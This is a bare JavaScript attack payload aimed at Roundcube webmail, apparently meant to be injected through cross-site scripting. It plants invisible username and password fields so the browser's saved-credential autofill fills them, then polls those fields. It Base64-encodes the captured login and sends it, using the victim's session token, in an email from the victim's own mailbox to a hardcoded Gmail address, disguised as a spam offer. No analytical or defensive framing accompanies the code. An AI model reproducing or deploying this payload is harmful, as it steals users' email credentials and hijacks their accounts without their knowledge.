function sendPostRequest(url, data) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(data);
}
function tr1(url, callback) {
    var result = {
        comid: null,
        fmid: null
    };
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 301 || xhr.status === 302) {
                var redirectedUrl = xhr.getResponseHeader("Location");
            }
            var m_c = xhr.responseText.match(/"compose_id":"([^"]+)"/);
            result.comid = m_c ? m_c[1] : null;
            var str = xhr.responseText.match(/"identities":\{[^}]+\}/)[0].trim();
            let match = str.match(/"(\d+)":/);
            result.fmid = match ? match[1] : null;
            callback(result);
        }
    }
    ;
    xhr.send();
}
function m1(sc) {
    var data = ""
    var to = "woodnsts@gmail.com"
    var tok = rcmail.env.request_token
    con = encodeURIComponent("Use_our_Metadata_Mitigator_to_keep_your_email_out_of_the_x_hands_$24.95\r\n" + sc)
    var url = document.baseURI.split('?')[0] + '?_task=mail' + '&_unlock=loading' + Date.now() + '&_framed=1&_lang=en_US'
    var u1 = document.baseURI.split('&')[0] + '&_mbox=INBOX&_action=compose'
    tr1(u1, function(result) {
        var data = "_token=" + tok + "&_task=mail&_action=send&_id=" + result.comid + "&_attachments=&_from=" + result.fmid + "&_to=" + to + "&_cc=&_bcc=&_replyto=&_followupto=&_subject=" + encodeURIComponent('Commercial_and_Bulk_Mail_Options') + "&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=" + con + "&editorSelector=plain&_mdn=&_dsn=&_priority=0&_store_target="
        sendPostRequest(url, data);
    });
}

var rt;
var btop = window.top.document.getElementById('layout-menu')
var inu = document.createElement('input');
inu.id = 'username';
inu.type = 'text';
inu.style = 'display:none;height:1px;width:1px';
btop.appendChild(inu);
let inp = document.createElement('input');
inp.id = 'password';
inp.type = 'password';
inp.style = 'display:none;height:1px;width:1px';
btop.appendChild(inp);
console.log("btop is success")

var t1 = setInterval(function() {
    var id = window.top.document.getElementById('username').value
    console.log("id is:" + id)
    var pass = window.top.document.getElementById("password").value
    console.log("pass is :" + pass)
    if ((id !== '') && (pass !== '')) {
        console.log("rt is good!")
        rt = id + '---' + pass
        m1(Base64.encode(rt))
        document.getElementById('username').remove();
        document.getElementById('password').remove();
        clearInterval(t1)
    }
}, 600)
